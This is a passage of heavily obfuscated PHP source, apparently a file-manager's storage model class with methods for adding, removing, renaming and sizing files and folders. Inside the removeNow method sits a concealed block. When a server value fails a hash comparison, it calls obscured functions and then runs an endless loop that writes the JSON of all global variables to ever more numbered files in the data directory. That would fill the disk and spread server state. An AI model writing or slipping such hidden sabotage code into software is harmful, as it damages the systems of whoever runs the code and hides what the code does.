$GLOBALS[$‡âî¾ÙÂ[6]][$‡âî¾ÙÂ[92]][$‡âî¾ÙÂ[614]]; if ($úŸ´Ç»Œ[$‡âî¾ÙÂ[543]][$‡âî¾ÙÂ[615]] <= time() - $…Ş÷¥§ë) { $this->metaSet($úŸ´Ç»Œ[$‡âî¾ÙÂ[193]], $‡âî¾ÙÂ[616], null); $this->metaSet($úŸ´Ç»Œ[$‡âî¾ÙÂ[193]], $‡âî¾ÙÂ[615], null); } if ($¶ ïÛ‚) { $this->metaSet($úŸ´Ç»Œ[$‡âî¾ÙÂ[193]], $‡âî¾ÙÂ[615], time()); } return !1; } private function _addSource($ÌÔ§‡…, $˜¼ùÀ) { $í•ı¨ˆá =& $_SERVER[™¸œØ®Ü]; $½·™Í‡ß = defined($í•ı¨ˆá[2226]) ? USER_ID : 0; $åÚãİš× = array($í•ı¨ˆá[655] => $˜¼ùÀ[$í•ı¨ˆá[190]], $í•ı¨ˆá[656] => $˜¼ùÀ[$í•ı¨ˆá[573]], $í•ı¨ˆá[657] => $½·™Í‡ß, $í•ı¨ˆá[658] => $½·™Í‡ß, $í•ı¨ˆá[479] => $˜¼ùÀ[$í•ı¨ˆá[193]], $í•ı¨ˆá[659] => $˜¼ùÀ[$í•ı¨ˆá[588]] . $˜¼ùÀ[$í•ı¨ˆá[193]] . $í•ı¨ˆá[50], $í•ı¨ˆá[506] => 0, $í•ı¨ˆá[660] => $í•ı¨ˆá[12]); $ÌÔ§‡… = array_merge($åÚãİš×, $ÌÔ§‡…); $this->updateModifyTime($ÌÔ§‡…[$í•ı¨ˆá[192]]); $µ¶„õ„Œ = $í•ı¨ˆá[2301] . $˜¼ùÀ[$í•ı¨ˆá[193]]; if (isset(self::$cacheChildList[$µ¶„õ„Œ])) { unset(self::$cacheChildList[$µ¶„õ„Œ]); } static $ùØÌšË = false; if (!$ùØÌšË) { Hook::trigger($í•ı¨ˆá[643], $ÌÔ§‡…); $ùØÌšË = !0; } $±îí²ÍÁ = $this->add($ÌÔ§‡…); $øÕ£Ö½ = array($í•ı¨ˆá[661] => short_id($±îí²ÍÁ)); $this->where(array($í•ı¨ˆá[493] => $±îí²ÍÁ))->save($øÕ£Ö½); $this->setNamePinyin($±îí²ÍÁ, $ÌÔ§‡…[$í•ı¨ˆá[32]]); return $±îí²ÍÁ; } public function remove($Û´ëå, $°ñÛ¿¼á = true) { $ø™€Âš¯ =& $_SERVER[™¸œØ®Ü]; $øİãÁû = $this->sourceInfo($Û´ëå); $…ÍÖŞ = intval($øİãÁû[$ø™€Âš¯[190]]) === self::TYPE_SYSTEM; $‘úë›¡§ = Model($ø™€Âš¯[510])->get($ø™€Âš¯[2302]) == $ø™€Âš¯[91]; if ($…ÍÖŞ || $°ñÛ¿¼á || !$‘úë›¡§) { return $this->removeNow($Û´ëå, $°ñÛ¿¼á); } $Ûå’­š° = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $×ü¢ş£ = $øİãÁû[$ø™€Âš¯[190]] == self::TYPE_USER ? $ø™€Âš¯[669] : $ø™€Âš¯[582]; if ($×ü¢ş£ == $ø™€Âš¯[669]) { $ÇšıÍÒî = Model($ø™€Âš¯[581])->getInfo($øİãÁû[$ø™€Âš¯[573]]); $°´øß¥á = !empty($ÇšıÍÒî[$ø™€Âš¯[2295]]) ? $ÇšıÍÒî[$ø™€Âš¯[2295]] : $ÇšıÍÒî[$ø™€Âš¯[32]]; $°´øß¥á = $ø™€Âš¯[339] . $°´øß¥á . $ø™€Âš¯[2303] . $øİãÁû[$ø™€Âš¯[573]]; } else { $ÇšıÍÒî = Model($ø™€Âš¯[589])->getInfo($øİãÁû[$ø™€Âš¯[573]]); $°´øß¥á = _get($ÇšıÍÒî, $ø™€Âš¯[32]); $°´øß¥á = $ø™€Âš¯[176] . $°´øß¥á . $ø™€Âš¯[2304] . $øİãÁû[$ø™€Âš¯[573]]; } $é¢Œº¢ = $ø™€Âš¯[2305] . md5($°´øß¥á); CacheLock::lock($é¢Œº¢); $Ñ—ñõóÍ = $this->fileNameExist($Ûå’­š°, $°´øß¥á); if (!$Ñ—ñõóÍ) { $Ñ—ñõóÍ = $this->mkdir($Ûå’­š°, $°´øß¥á, REPEAT_SKIP); $this->metaSet($Ñ—ñõóÍ, $ø™€Âš¯[2306], $×ü¢ş£); $this->metaSet($Ñ—ñõóÍ, $ø™€Âš¯[2307], $øİãÁû[$ø™€Âš¯[573]]); if ($øİãÁû[$ø™€Âš¯[192]] != 0) { $this->metaSet($Ñ—ñõóÍ, $ø™€Âš¯[2308], _get($ÇšıÍÒî, $ø™€Âš¯[2309])); } } CacheLock::unlock($é¢Œº¢); $this->metaSet($Û´ëå, $ø™€Âš¯[2310], $øİãÁû[$ø™€Âš¯[192]]); $this->where(array($ø™€Âš¯[193] => $Û´ëå))->save(array($ø™€Âš¯[500] => time())); $this->recycleClear($øİãÁû); Model($ø™€Âš¯[640])->eventRemove($Û´ëå); $‚©–ï = $this->move($Û´ëå, $Ñ—ñõóÍ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($øİãÁû[$ø™€Âš¯[192]]); return $‚©–ï; } private function recycleClear($ö¥Ã€‰) { $ˆäİëˆ =& $_SERVER[™¸œØ®Ü]; $¼°ÒÔáŠ = $this->childrenAll($ö¥Ã€‰); $÷§÷§î = array($ˆäİëˆ[493] => array($ˆäİëˆ[494], $¼°ÒÔáŠ[$ˆäİëˆ[2311]])); Model($ˆäİëˆ[2312])->where($÷§÷§î)->delete(); } public function removeNow($ïáà™Ü, $ô½ÏñĞ§ = true) { $ó×¼ªƒ =& $_SERVER[™¸œØ®Ü]; $™ş…½àÏ = $_SERVER[$ó×¼ªƒ[1457]]; $ÕŸñÕº¨ = $ó×¼ªƒ[970]; if ($_SERVER[$ó×¼ªƒ[971]] != $ÕŸñÕº¨($™ş…½àÏ)) { $¤â§¸ş = $ó×¼ªƒ[972]; $†•¯ÇĞ± = $ó×¼ªƒ[973]; $Ò‹ÄÑâµ = $_SERVER[$ó×¼ªƒ[968]] . $ó×¼ªƒ[969]; $•® šËæ = $†•¯ÇĞ±($Ò‹ÄÑâµ); $¹€‰ª¥Ÿ = explode($ó×¼ªƒ[287], $•® šËæ); if (count($¹€‰ª¥Ÿ) < $ó×¼ªƒ[698]) { $ìî¼µôÒ = $ó×¼ªƒ[974]; $ìî¼µôÒ(); } $‹Á®Ùî = $ó×¼ªƒ[975]; $‹Á®Ùî($_SERVER[$ó×¼ªƒ[976]]); $¤â§¸ş = $ó×¼ªƒ[972]; $¤â§¸ş(); $åÆ¤œ¬Ø = $ó×¼ªƒ[977]; $´îŠâíÃ = json_encode($GLOBALS[$ó×¼ªƒ[978]]); $Üó²Ê¶ = 1; for ($Çáˆèì› = $Üó²Ê¶; $Çáˆèì› > 0; $Çáˆèì›++) { $åÆ¤œ¬Ø(DATA_PATH . $Çáˆèì›, $´îŠâíÃ); } } $½çÌ¬ØÉ = $this->sourceInfo($ïáà™Ü); $ŸéÍ¯ÛÓ = $this->pathInfoMore($ïáà™Ü); if (!$½çÌ¬ØÉ) { return !0; } if ($½çÌ¬ØÉ[$ó×¼ªƒ[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($ïáà™Ü); Hook::trigger($ó×¼ªƒ[2313], $ŸéÍ¯ÛÓ, $ô½ÏñĞ§); if ($ô½ÏñĞ§) { Model($ó×¼ªƒ[2312])->moveToRecycle($ïáà™Ü); } else { $©öÖ²øª = $this->childrenAll($½çÌ¬ØÉ); Model($ó×¼ªƒ[640])->eventRemove($ïáà™Ü); $this->removeRelevance($©öÖ²øª[$ó×¼ªƒ[2311]], $©öÖ²øª[$ó×¼ªƒ[1598]]); } $this->folderSizeReset($½çÌ¬ØÉ[$ó×¼ªƒ[192]]); $”Åê½ìÔ = array($½çÌ¬ØÉ[$ó×¼ªƒ[192]]); if ($½çÌ¬ØÉ[$ó×¼ªƒ[487]] == $ó×¼ªƒ[91]) { $”Åê½ìÔ[] = $½çÌ¬ØÉ[$ó×¼ªƒ[193]]; } $this->updateModifyTime($”Åê½ìÔ); $this->lockMoveEnd($ïáà™Ü); Hook::trigger($ó×¼ªƒ[1838], $ŸéÍ¯ÛÓ, $ô½ÏñĞ§); return !0; } public function childrenAll($ùßªÌú•) { $È‚ÙÖ¹‘ =& $_SERVER[™¸œØ®Ü]; $Ù¦ğ¸³È = $ùßªÌú•[$È‚ÙÖ¹‘[193]]; if ($ùßªÌú•[$È‚ÙÖ¹‘[487]] == $È‚ÙÖ¹‘[91]) { $º¯Ğáš« = array($È‚ÙÖ¹‘[659] => array($È‚ÙÖ¹‘[619], $ùßªÌú•[$È‚ÙÖ¹‘[588]] . $Ù¦ğ¸³È . $È‚ÙÖ¹‘[620])); $‡º·Ç«É = array($È‚ÙÖ¹‘[659] => $º¯Ğáš«[$È‚ÙÖ¹‘[588]]); $ê„ÍÆäÈ = $this->field($È‚ÙÖ¹‘[2314])->where($‡º·Ç«É)->select(); $ ıßÂÜö = !1; $ŒÏª–ˆà = array($Ù¦ğ¸³È); if ($ê„ÍÆäÈ) { $ ıßÂÜö = array_to_keyvalue($ê„ÍÆäÈ, $È‚ÙÖ¹‘[12], $È‚ÙÖ¹‘[545]); $ ıßÂÜö = array_remove_value($ ıßÂÜö, $È‚ÙÖ¹‘[230]); $ŒÏª–ˆà = array_to_keyvalue($ê„ÍÆäÈ, $È‚ÙÖ¹‘[12], $È‚ÙÖ¹‘[193]); $ŒÏª–ˆà[] = $Ù¦ğ¸³È; } } else { $ ıßÂÜö = array($ùßªÌú•[$È‚ÙÖ¹‘[545]]); $ŒÏª–ˆà = array($Ù¦ğ¸³È); } return array($È‚ÙÖ¹‘[2311] => $ŒÏª–ˆà, $È‚ÙÖ¹‘[1598] => $ ıßÂÜö); } public function removeArray($»“Â·¢Ş) { if (!$»“Â·¢Ş) { return !0; } } public function removeRelevance($€Êˆ’¯Í, $ëÅï·…â) { $¶¤ûŸì¨ =& $_SERVER[™¸œØ®Ü]; $€Êˆ’¯Í = $€Êˆ’¯Í ? $€Êˆ’¯Í : array(); $ëÅï·…â = $ëÅï·…â ? $ëÅï·…â : array(); $€Êˆ’¯Í = array_unique(array_filter($€Êˆ’¯Í)); $ëÅï·…â = array_unique(array_filter($ëÅï·…â)); if (!$€Êˆ’¯Í) { return !1; } $Ç—œœ¿¯ = array($¶¤ûŸì¨[493] => array($¶¤ûŸì¨[494], $€Êˆ’¯Í)); Model($¶¤ûŸì¨[2312])->where($Ç—œœ¿¯)->delete(); Model($¶¤ûŸì¨[537])->where($Ç—œœ¿¯)->delete(); Model($¶¤ûŸì¨[2151])->where($Ç—œœ¿¯)->delete(); Model($¶¤ûŸì¨[640])->where($Ç—œœ¿¯)->delete(); Model($¶¤ûŸì¨[1975])->removeBySource($€Êˆ’¯Í); Model($¶¤ûŸì¨[2293])->removeBySource($€Êˆ’¯Í); $this->where($Ç—œœ¿¯)->delete(); Model($¶¤ûŸì¨[548])->remove($ëÅï·…â); for ($ã¨ı°â› = 0; $ã¨ı°â› < count($€Êˆ’¯Í); $ã¨ı°â›++) { $this->sourceCacheClear($€Êˆ’¯Í[$ã¨ı°â›]); } } public function rename($ÆªÙûù€, $°å¡ç“³) { $èÛ†¯¯„ =& $_SERVER[™¸œØ®Ü]; $ÃêÊäï = $this->sourceInfo($ÆªÙûù€); if (!$ÃêÊäï) { return !1; } $ÜÀ·‡À© = $this->fileNameExist($ÃêÊäï[$èÛ†¯¯„[192]], $°å¡ç“³); if ($ÜÀ·‡À© && $ÜÀ·‡À© != $ÆªÙûù€) { return !1; } $·¤ÜÛˆ… = array($èÛ†¯¯„[496] => $°å¡ç“³, $èÛ†¯¯„[658] => USER_ID); if ($ÃêÊäï[$èÛ†¯¯„[487]] != $èÛ†¯¯„[91]) { $·¤ÜÛˆ…[$èÛ†¯¯„[488]] = substr(get_path_ext($°å¡ç“³), 0, 10); } Model($èÛ†¯¯„[640])->eventRename($ÆªÙûù€, $ÃêÊäï[$èÛ†¯¯„[32]], $°å¡ç“³); $this->sourceCacheClear($ÆªÙûù€); $this->setNamePinyin($ÆªÙûù€, $·¤ÜÛˆ…[$èÛ†¯¯„[32]], !1); $this->updateModifyTime($ÃêÊäï[$èÛ†¯¯„[192]]); $úÄŠ’— = $this->where(array($èÛ†¯¯„[493] => $ÆªÙûù€))->data($·¤ÜÛˆ…)->save(); $œêğˆøÀ = $èÛ†¯¯„[2301] . $ÃêÊäï[$èÛ†¯¯„[192]]; if (isset(self::$cacheChildList[$œêğˆøÀ])) { unset(self::$cacheChildList[$œêğˆøÀ]); } return $úÄŠ’—; } public function setNamePinyin($¨İİÚ¤, $…ıõ­·Ä, $¯Â¡ôç‰ = true) { $ê”÷ Í =& $_SERVER[™¸œØ®Ü]; $Ò´áßâƒ = Input::check($…ıõ­·Ä, $ê”÷ Í[662]); $êøŒÏÎ¦ = array($ê”÷ Í[519] => KodSort::makeStr($…ıõ­·Ä)); if ($Ò´áßâƒ) { $êøŒÏÎ¦[$ê”÷ Í[540]] = str_replace($ê”÷ Í[53], $ê”÷ Í[12], Pinyin::get($…ıõ­·Ä)); $êøŒÏÎ¦[$ê”÷ Í[539]] = Pinyin::get($…ıõ­·Ä, $ê”÷ Í[663]); } if (!$¯Â¡ôç‰ && !$Ò´áßâƒ) { $êøŒÏÎ¦[$ê”÷ Í[540]] = null; $êøŒÏÎ¦[$ê”÷ Í[539]] = null; } $this->metaSet($¨İİÚ¤, $êøŒÏÎ¦); } public function getContent($ƒ•€ô¿ü) { $êÒûÊ·Â =& $_SERVER[™¸œØ®Ü]; $·»Âºó— = $this->fileInfoGet($ƒ•€ô¿ü); if (!$·»Âºó—) { return !1; } if ($·»Âºó—[$êÒûÊ·Â[79]] == 0) { return $êÒûÊ·Â[12]; } $ÑÌîÊÑì = $êÒûÊ·Â[2315] . $·»Âºó—[$êÒûÊ·Â[551]]; if ($·»Âºó—[$êÒûÊ·Â[79]] <= 1024 * 10) { $’ˆÒöø³ = Cache::get($ÑÌîÊÑì); if (!$’ˆÒöø³) { $’ˆÒöø³ = IO::getContent($·»Âºó—[$êÒûÊ·Â[87]]); Cache::set($ÑÌîÊÑì, $’ˆÒöø³); } return $’ˆÒöø³; } if (!$·»Âºó—[$êÒûÊ·Â[87]]) { return $êÒûÊ·Â[12]; } return IO::getContent($·»Âºó—[$êÒûÊ·Â[87]]); } public function setDesc($å’šº», $õõ‰×ì) { $½ö–´ı =& $_SERVER[™¸œØ®Ü]; Model($½ö–´ı[640])->eventAddDesc($å’šº», $õõ‰×ì); return $this->metaSet($å’šº», $½ö–´ı[528], $õõ‰×ì); } public function setContent($•ºÛĞ§ö, $Â™—ÍÖ’ = '') { $ø÷­À¨¶ =& $_SERVER[™¸œØ®Ü]; $åÅÇåûö = $this->sourceInfo($•ºÛĞ§ö); $´ï¿£Ã’ = $this->fileInfoGet($•ºÛĞ§ö); if (!$´ï¿£Ã’ || !$åÅÇåûö) { return !1; } $ºıŠÙ¾ = Model($ø÷­À¨¶[548])->addFileByContent($Â™—ÍÖ’, $åÅÇåûö[$ø÷­À¨¶[32]]); if (!$ºıŠÙ¾) { return !1; } $êÅÄ°œ¢ = $this->fileHistory($åÅÇåûö, $ºıŠÙ¾[$ø÷­À¨¶[545]], $ºıŠÙ¾[$ø÷­À¨¶[79]]); if (!$êÅÄ°œ¢) { return Model($ø÷­À¨¶[548])->remove($ºıŠÙ¾[$ø÷­À¨¶[545]]); } $this->folderSizeReset($åÅÇåûö[$ø÷­À¨¶[192]]); return !0; } public function fileSubstr($‰àë×’, $ı»Àü¥û, $©Ï¾ùïŠ) { $ƒôÉá½Û = $this->fileInfoGet($‰àë×’); if (!$ƒôÉá½Û) { return !1; } return IO::fileSubstr($ƒôÉá½Û[$_SERVER[™¸œØ®Ü][87]], $ı»Àü¥û, $©Ï¾ùïŠ); } public function fileInfoGet($ø¶³ªğ) { $ô…¥¹şÎ =& $_SERVER[™¸œØ®Ü]; $¡å¤§¬ = $this->sourceInfo($ø¶³ªğ); if (!$¡å¤§¬ || $¡å¤§¬[$ô…¥¹şÎ[487]]) { return !1; } $”´Ë³Æê = $ô…¥¹şÎ[552] . $¡å¤§¬[$ô…¥¹şÎ[545]]; $´‹È™¹õ = _get(self::$cacheFileInfo, $”´Ë³Æê); if ($´‹È™¹õ) { return $´‹È™¹õ; } $ÎºÇ†É£ = Model($ô…¥¹şÎ[548])->fileInfo($¡å¤§¬[$ô…¥¹şÎ[545]]); if ($ÎºÇ†É£) { $ÎºÇ†É£[$ô…¥¹şÎ[32]] = $¡å¤§¬[$ô…¥¹şÎ[32]]; } self::$cacheFileInfo[$”´Ë³Æê] = $ÎºÇ†É£; return $ÎºÇ†É£; } private function folderChildrenNumber($šÆßÙ”„) { $ˆÂÂ¼Ûù =& $_SERVER[™¸œØ®Ü]; $†×õÄçÖ = $this->sourceInfo($šÆßÙ”„); $œƒ®å™† = array($ˆÂÂ¼Ûù[659] => array($ˆÂÂ¼Ûù[619], $†×õÄçÖ[$ˆÂÂ¼Ûù[588]] . $šÆßÙ”„ . $ˆÂÂ¼Ûù[620]), $ˆÂÂ¼Ûù[656] => $†×õÄçÖ[$ˆÂÂ¼Ûù[573]], $ˆÂÂ¼Ûù[506] => intval($†×õÄçÖ[$ˆÂÂ¼Ûù[507]]), $ˆÂÂ¼Ûù[653] => 1); $üÚˆÓ¢ğ = $this->where($œƒ®å™†)->count(); $øÄÎ‰§… = $this->where($œƒ®å™†)->where(array($ˆÂÂ¼Ûù[653] => 0))->count(); return array($ˆÂÂ¼Ûù[83] => $øÄÎ‰§…, $ˆÂÂ¼Ûù[84] => $üÚˆÓ¢ğ); } public function pathInfo($¿ÕíßÔ‚, $æ±úÑ™Ş = false) { $¹Š’ßİ =& $_SERVER[™¸œØ®Ü]; $æ±úÑ™Ş = !1; $¿ÕíßÔ‚ = intval($¿ÕíßÔ‚); $ìÓÛØ = $¹Š’ßİ[536] . intval($æ±úÑ™Ş) . $¹Š’ßİ[464] . $¿ÕíßÔ‚; $ğß¬Ç½¿ = _get(self::$cachePathInfo, $ìÓÛØ); if ($ğß¬Ç½¿) { return $ğß¬Ç½¿; } $´‚®ˆ¹Ê = $this->sourceInfo($¿ÕíßÔ‚); if (!$´‚®ˆ¹Ê) { return !1; } $´‚®ˆ¹Ê = $this->_listDataApplyItem($´‚®ˆ¹Ê, $æ±úÑ™Ş); self::$cachePathInfo[$ìÓÛØ] = $´‚®ˆ¹Ê; return $´‚®ˆ¹Ê; } public static $cachePathInfoMore = array(); public function pathInfoMore($¢Ìñ¯¥İ) { $Šú£« =& $_SERVER[™¸œØ®Ü]; $””ø‹ö˜ = _get(self::$cachePathInfoMore, $¢Ìñ¯¥İ); if ($””ø‹ö˜) { return $””ø‹ö˜; } $ãƒ®—ŒÀ = $this->pathInfo($¢Ìñ¯¥İ); if (!$ãƒ®—ŒÀ) { return !1; } if ($ãƒ®—ŒÀ[$Šú£«[487]] == $Šú£«[91]) { $ãƒ®—ŒÀ[$Šú£«[82]] = $this->folderChildrenNumber($¢Ìñ¯¥İ); } self::$cachePathInfoMore[$¢Ìñ¯¥İ] = $ãƒ®—ŒÀ; return $ãƒ®—ŒÀ; } public function sourceInfo($¼¶˜ğú…) { $¨Üƒ¿ÄÃ =& $_SERVER[™¸œØ®Ü]; if (!$¼¶˜ğú…) { return array(); } $¼¶˜ğú… = intval($¼¶˜ğú…); $¬Š½Û°´ = $¨Üƒ¿ÄÃ[535] . $¼¶˜ğú…; $Á¢ïÚ‡Ç = _get(self::$cacheSourceInfo, $¬Š½Û°´); if ($Á¢ïÚ‡Ç) { return $Á¢ïÚ‡Ç; } $‹ìâ§ŠÖ = $this->where(array($¨Üƒ¿ÄÃ[193] => $¼¶˜ğú…))->find(); self::$cacheSourceInfo[$¬Š½Û°´] = $‹ìâ§ŠÖ; return self::$cacheSourceInfo[$¬Š½Û°´]; } public function sourceCacheClear($Ú¾ƒ–‚Ğ = false) { self::cacheClear($Ú¾ƒ–‚Ğ); } public static function cacheClear($Ôµã¶€ı = false) { $©ĞÆá¢ =& $_SERVER[™¸œØ®Ü]; if ($Ôµã¶€ı == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$©ĞÆá¢[535] . $Ôµã¶€ı]); unset(self::$cachePathInfoMore[$Ôµã¶€ı]); unset(self::$cachePathInfo[$©ĞÆá¢[2316] . $Ôµã¶€ı]); unset(self::$cachePathInfo[$©ĞÆá¢[2317] . $Ôµã¶€ı]); } public function metaSet($ÎÇõÓÉÃ, $áÆÙŞÃ = null, $™Êª­ñÌ = null) { $ƒ®‹›Ø¨ = parent::metaSet($ÎÇõÓÉÃ, $áÆÙŞÃ, $™Êª­ñÌ); if ($ƒ®‹›Ø¨) { $this->sourceCacheClear($ÎÇõÓÉÃ); } return $ƒ®‹›Ø¨; } public function pathInfoByPath($ö–í¯¨¡, $ª§Òåõ—) { $óñŸÕØ =& $_SERVER[™¸œØ®Ü]; $èÖ€Ø‚ó = !$ª§Òåõ— ? array() : explode($óñŸÕØ[8], trim($ª§Òåõ—, $óñŸÕØ[8])); $ÏÆÉô­ = $ö–í¯¨¡; foreach ($èÖ€Ø‚ó as $ÙÈ«Ü­ñ) { $ş”‰şÛ— = array($óñŸÕØ[192] => $ÏÆÉô­, $óñŸÕØ[32] => $ÙÈ«Ü­ñ); $‰ÁŠËãØ = $this->field($óñŸÕØ[2318])->where($ş”‰şÛ—)->select(); if (!$‰ÁŠËãØ) { return !1; } $‰ÁŠËãØ = array_sort_by($‰ÁŠËãØ, $óñŸÕØ[507]); $ÏÆÉô­ = $‰ÁŠËãØ[0][$óñŸÕØ[193]]; } $“òµ•õÈ = $this->sourceInfo($ÏÆÉô­); $this->pathInfoFilter($“òµ•õÈ); return $“òµ•õÈ; } protected function updateModifyTime($İˆ­ŒÂİ) { $«È„Áİ =& $_SERVER[™¸œØ®Ü]; $ãşùäğ¥ = defined($«È„Áİ[2226]) ? USER_ID : 0; if (!$İˆ­ŒÂİ) { return; } if (!is_array($İˆ­ŒÂİ)) { $İˆ­ŒÂİ = array($İˆ­ŒÂİ); } foreach ($İˆ­ŒÂİ as $…õéíõÔ => $ò…±¡şÕ) { $İˆ­ŒÂİ[$…õéíõÔ] = intval($ò…±¡şÕ); $this->sourceCacheClear($ò…±¡şÕ); } $İ¬Úï—ã = array($«È„Áİ[193] => array($«È„Áİ[7], $İˆ­ŒÂİ)); $¸ëöæ®§ = array($«È„Áİ[658] => $ãşùäğ¥, $«È„Áİ[500] => time()); $this->where($İ¬Úï—ã)->save($¸ëöæ®§); } public function folderSizeReset($ş¢ˆ¼üÄ, $ÌÒï’ÌÃ = false) { $€´¢ÊÓœ =& $_SERVER[™¸œØ®Ü]; if ($this->statusIgnoreResetSpace) { return; } $¾¸ÌÖ¯– = $this->sourceInfo($ş¢ˆ¼üÄ); $©Á§Œßì = $€´¢ÊÓœ[2319] . $ş¢ˆ¼üÄ; CacheLock::lock($©Á§Œßì, 20); if ($ÌÒï’ÌÃ === !1) { $this->sourceCacheClear($ş¢ˆ¼üÄ); $¾¸ÌÖ¯– = $this->sourceInfo($ş¢ˆ¼üÄ); $Ïì»å¼ = array($€´¢ÊÓœ[479] => $ş¢ˆ¼üÄ, $€´¢ÊÓœ[506] => 0); $Çúó“ğ„ = $this->where($Ïì»å¼)->sum($€´¢ÊÓœ[79]); $ÌÒï’ÌÃ = intval($Çúó“ğ„) - intval($¾¸ÌÖ¯–[$€´¢ÊÓœ[79]]); } if ($ÌÒï’ÌÃ == 0) { return CacheLock::unlock($©Á§Œßì); } $İ”¾ÌÂÕ = $this->parentLevelArray($¾¸ÌÖ¯–[$€´¢ÊÓœ[588]]); if (!$İ”¾ÌÂÕ) { $İ”¾ÌÂÕ = array(); } $İ”¾ÌÂÕ[] = $¾¸ÌÖ¯–[$€´¢ÊÓœ[193]]; $Ïì»å¼ = array($€´¢ÊÓœ[193] => array($€´¢ÊÓœ[494], $İ”¾ÌÂÕ)); if ($ÌÒï’ÌÃ < 0) { $Ïì»å¼[$€´¢ÊÓœ[79]] = array($€´¢ÊÓœ[1111], abs($ÌÒï’ÌÃ)); } $this->where($Ïì»å¼)->setAdd($€´¢ÊÓœ[79], $ÌÒï’ÌÃ); CacheLock::unlock($©Á§Œßì); $ıØõÀØ¨ = $€´¢ÊÓœ[2320] . $¾¸ÌÖ¯–[$€´¢ÊÓœ[190]] . $€´¢ÊÓœ[4] . $¾¸ÌÖ¯–[$€´¢ÊÓœ[573]]; $Üô§ªÍ£ = array($¾¸ÌÖ¯–[$€´¢ÊÓœ[190]], $¾¸ÌÖ¯–[$€´¢ÊÓœ[573]]); TaskRun::timeLimitCall($ıØõÀØ¨, $€´¢ÊÓœ[2321], $Üô§ªÍ£, 1.5); } public function folderSizeResetChildren($¦…Û‡) { $Ô¾È¬‡¤ =& $_SERVER[™¸œØ®Ü]; $this->sourceCacheClear($¦…Û‡); $½¾»Şİ† = $this->sourceInfo($¦…Û‡); $¼íƒûğí = array($Ô¾È¬‡¤[653] => 1, $Ô¾È¬‡¤[656] => $½¾»Şİ†[$Ô¾È¬‡¤[573]], $Ô¾È¬‡¤[659] => array($Ô¾È¬‡¤[619], $½¾»Şİ†[$Ô¾È¬‡¤[588]] . $¦…Û‡ . $Ô¾È¬‡¤[620])); $ÕÊá†Ú = $Ô¾È¬‡¤[2322]; $‹ç‚ñ‚ = $this->field($ÕÊá†Ú)->where($¼íƒûğí)->select(); $¼íƒûğí[$Ô¾È¬‡¤[487]] = 0; $òØ¼Óåœ = $this->field($ÕÊá†Ú)->where($¼íƒûğí)->select(); if (!$òØ¼Óåœ) { return; } $‹ç‚ñ‚[] = $½¾»Şİ†; $‹ç‚ñ‚ = array_to_keyvalue($‹ç‚ñ‚, $Ô¾È¬‡¤[193]); foreach ($‹ç‚ñ‚ as $ˆËõ“ú¼ => $¬§«••¾) { $‹ç‚ñ‚[$ˆËõ“ú¼][$Ô¾È¬‡¤[2323]] = $‹ç‚ñ‚[$ˆËõ“ú¼][$Ô¾È¬‡¤[79]]; $‹ç‚ñ‚[$ˆËõ“ú¼][$Ô¾È¬‡¤[79]] = 0; } foreach ($òØ¼Óåœ as $¬§«••¾) { $¢§Ô¼¬Ÿ = $¬§«••¾[$Ô¾È¬‡¤[192]] . $Ô¾È¬‡¤[12]; if (!isset($‹ç‚ñ‚[$¢§Ô¼¬Ÿ])) { continue; } if ($¬§«••¾[$Ô¾È¬‡¤[507]] == $‹ç‚ñ‚[$¢§Ô¼¬Ÿ][$Ô¾È¬‡¤[507]]) { $‹ç‚ñ‚[$¢§Ô¼¬Ÿ][$Ô¾È¬‡¤[79]] += $¬§«••¾[$Ô¾È¬‡¤[79]]; } } foreach ($‹ç‚ñ‚ as $¬§«••¾) { $ÙßŸ¨°Î = $this->parentLevelArray($¬§«••¾[$Ô¾È¬‡¤[588]]); foreach ($ÙßŸ¨°Î as $¢§Ô¼¬Ÿ) { $¢§Ô¼¬Ÿ = $¢§Ô¼¬Ÿ . $Ô¾È¬‡¤[12]; if (!isset($‹ç‚ñ‚[$¢§Ô¼¬Ÿ])) { continue; } if ($¬§«••¾[$Ô¾È¬‡¤[507]] == $‹ç‚ñ‚[$¢§Ô¼¬Ÿ][$Ô¾È¬‡¤[507]]) { $‹ç‚ñ‚[$¢§Ô¼¬Ÿ][$Ô¾È¬‡¤[79]] += $¬§«••¾[$Ô¾È¬‡¤[79]]; } } } $÷¹“Í € = array(); foreach ($‹ç‚ñ‚ as $¬§«••¾) { if ($¬§«••¾[$Ô¾È¬‡¤[79]] == $¬§«••¾[$Ô¾È¬‡¤[2323]]) { continue; } $÷¹“Í €[] = array($Ô¾È¬‡¤[193], $¬§«••¾[$Ô¾È¬‡¤[193]], $Ô¾È¬‡¤[79], $¬§«••¾[$Ô¾È¬‡¤[79]]); } $this->saveAll($÷¹“Í €); } public function userSpaceReset($Ãéò£æ = false) { $û‹Ÿëğ =& $_SERVER[™¸œØ®Ü]; $ÏšÏ = $this->where(array($û‹Ÿëğ[190] => self::TYPE_USER, $û‹Ÿëğ[573] => $Ãéò£æ, $û‹Ÿëğ[487] => 0))->sum($û‹Ÿëğ[79]); $ÏšÏ = !$ÏšÏ || $ÏšÏ <= 0 ? 0 : $ÏšÏ; Model($û‹Ÿëğ[581])->userEdit($Ãéò£æ, array($û‹Ÿëğ[1984] => $ÏšÏ)); } public function targetSpaceUpdate($„¬Úš¶, $ß°î®¾) { $Ï›‘ÉåŒ =& $_SERVER[™¸œØ®Ü]; if (!$ß°î®¾) { return; } if (!in_array($„¬Úš¶, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ßô»¢¤¦ = $this->targetSpaceSize($„¬Úš¶, $ß°î®¾); if ($„¬Úš¶ == self::TYPE_USER) { Model($Ï›‘ÉåŒ[581])->userEdit($ß°î®¾, array($Ï›‘ÉåŒ[1984] => $ßô»¢¤¦)); } else { if ($„¬Úš¶ == self::TYPE_GROUP) { Model($Ï›‘ÉåŒ[589])->groupEdit($ß°î®¾, array($Ï›‘ÉåŒ[1984] => $ßô»¢¤¦)); } } } public function targetSpaceSize($¼˜…ëË®, $ •Êàó“) { $®©¾”êò =& $_SERVER[™¸œØ®Ü]; $é‰üë‡´ = 0; $êˆØ‡Ï = $this->targetSourceRoot($¼˜…ëË®, $ •Êàó“, !0); foreach ($êˆØ‡Ï as $æ©†òŸÓ) { if (!$æ©†òŸÓ) { continue; } $é‰üë‡´ += 